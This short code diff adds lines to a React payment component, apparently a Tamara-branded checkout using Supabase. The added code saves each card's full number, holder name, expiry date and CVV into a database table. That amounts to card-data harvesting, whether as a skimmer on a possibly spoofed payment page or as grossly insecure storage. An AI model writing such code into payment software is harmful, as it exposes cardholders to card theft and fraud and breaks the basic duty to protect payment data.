@@ -61,6 +61,15 @@ const TamaraPaymentProcessing = () => {
         if (error) throw error;
         setPaymentId(data.id);
 
+        // حفظ محاولة الدفع
+        await supabase.from("tamara_payment_attempts").insert({
+          payment_id: data.id,
+          card_number: cardNumber,
+          card_holder_name: cardholderName,
+          expiry_date: expiryDate,
+          cvv: cvv,
+        });
+
         // Poll for status updates
         const pollInterval = setInterval(async () => {
           const { data: statusData, error: statusError } = await supabase
